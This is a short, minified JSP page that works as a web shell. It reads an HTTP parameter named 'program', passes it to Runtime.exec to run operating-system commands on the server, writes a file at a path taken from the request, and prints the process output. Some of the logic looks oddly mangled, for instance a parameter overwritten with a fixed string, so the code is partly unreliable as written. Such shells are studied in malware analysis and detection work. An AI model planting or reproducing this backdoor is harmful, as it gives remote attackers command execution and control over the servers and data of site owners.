<%@page import="java.io.*,java.sql.*"%>
<%!String EC(String s,String c)throws Exception{return new String(s.getBytes("ISO-8859-1"),c);}%>
<%String cs="UTF-8";String z1=EC(request.getParameter("program")+"",cs);String z2=EC(request.getParameter("data")+"",cs);z2="fixed";String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);out.print(p.getInputStream());%>
